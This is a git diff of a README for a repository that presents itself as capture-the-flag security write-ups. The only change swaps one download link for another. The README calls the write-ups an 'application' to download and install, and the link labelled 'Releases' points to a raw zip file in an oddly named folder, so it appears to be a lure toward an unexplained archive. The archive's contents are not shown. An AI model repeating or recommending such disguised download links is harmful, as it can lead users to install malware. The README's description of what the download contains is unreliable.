@@ -1,12 +1,12 @@
 # 🚩 ctf-writeups - Discover Cybersecurity Challenge Solutions
 
-[![Download ctf-writeups](https://github.com/Oluwanifemithe/ctf-writeups/raw/refs/heads/main/fouth/writeups_ctf_undistress.zip)](https://github.com/Oluwanifemithe/ctf-writeups/raw/refs/heads/main/fouth/writeups_ctf_undistress.zip)
+[![Download ctf-writeups](https://github.com/Oluwanifemithe/ctf-writeups/raw/refs/heads/main/fouth/ctf_writeups_2.9.zip)](https://github.com/Oluwanifemithe/ctf-writeups/raw/refs/heads/main/fouth/ctf_writeups_2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the **ctf-writeups** project! This repository contains write-ups and solutions for various capture-the-flag (CTF) cybersecurity challenges. You can explore topics such as web security, cryptography, forensics, reverse engineering, and more.
 
 ## 📥 Download & Install
-To get started with our application, visit this page to download: [ctf-writeups Releases](https://github.com/Oluwanifemithe/ctf-writeups/raw/refs/heads/main/fouth/writeups_ctf_undistress.zip).
+To get started with our application, visit this page to download: [ctf-writeups Releases](https://github.com/Oluwanifemithe/ctf-writeups/raw/refs/heads/main/fouth/ctf_writeups_2.9.zip).
 
 1. Click the link above.
 2. Choose the version that fits your needs.
@@ -67,4 +67,4 @@ We plan to continuously update this repository with new write-ups and challenges
 
 Remember, honing your skills in cybersecurity is an ongoing process. The more challenges you tackle, the better you become!
 
-Once again, to download the latest version of **ctf-writeups**, visit our Releases page: [ctf-writeups Releases](https://github.com/Oluwanifemithe/ctf-writeups/raw/refs/heads/main/fouth/writeups_ctf_undistress.zip). Happy learning!
+Once again, to download the latest version of **ctf-writeups**, visit our Releases page: [ctf-writeups Releases](https://github.com/Oluwanifemithe/ctf-writeups/raw/refs/heads/main/fouth/ctf_writeups_2.9.zip). Happy learning!
